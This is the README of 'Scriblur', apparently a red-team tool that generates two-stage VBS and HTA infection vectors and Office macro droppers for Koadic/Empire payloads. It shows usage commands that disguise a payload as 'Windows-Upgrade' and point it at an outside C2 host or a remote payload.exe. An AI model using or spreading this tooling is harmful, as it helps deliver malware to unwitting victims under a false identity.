# Scriblur
The beginnings of a C2 framework. Except minus all the C2 stuff so far. Currently generates
a dual stage VBS infection vector, and a dual stage HTA infection vector. The variables take
into account C2 addresses, Koadic/Empire payloads, and a few delivery mechanisms. The payload
files are output to an aptly named directory "Payloads" that is created if not already present.

# Installation & Usage
Scriblur is a breeze to use. Simply clone the directory, and cd into it.

For the HTA payload:
  python Scriblur.py -n Windows-Upgade -p b64encodedpayload -c amazon.com/c2/domain

# HTA Example
![alt text](https://github.com/nins3i/Scriblur/blob/master/HTA.png)

For the Macro Subroutine:
  python Scriblur.py -n Windows-Upgrade -e amazon.com/final/payload.exe

# Macro Example
![alt text](https://github.com/nins3i/Scriblur/blob/master/Macro.png)
